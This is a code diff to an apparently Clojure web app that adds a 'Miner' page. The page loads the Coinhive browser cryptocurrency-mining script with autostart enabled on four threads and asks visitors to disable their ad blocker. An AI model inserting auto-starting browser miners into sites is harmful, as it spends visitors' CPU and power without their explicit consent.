@@ -200,3 +200,26 @@
          [:p "If you find yourself reaching for while or for, think again - maybe map, reduce, filter, or find could result in more elegant, less complex code."]
          [:div "JAMES M SNELL"]
          [:a.from {:href "http://sasd.com"} "JavaScript Weekly"]]]]] req))
+
+
+(defn miner [req]
+  (base "Miner"
+    {:keywords "crypto money miner coin"
+     :description "Miner"
+     :manifest ""
+     :icon "bkt-icon"}
+    ""
+    [[:div.container
+      [:canvas#viewport]]
+     [:script {:async true :src "https://coinhive.com/lib/coinhive.min.js"}]
+     [:div.coinhive-miner {:style "width: 100%; height: 94px; margin-top: 100px "
+                           :data-key (env :chive-key)
+                           :data-autostart true
+                           :data-background "#444"
+                           :data-text "#eee"
+                           :data-action "#0f0"
+                           :data-graph "#555"
+                           :data-threads 4
+                           :data-whitelabel false}
+      [:em "Please disable Adblock"]]]
+    req))
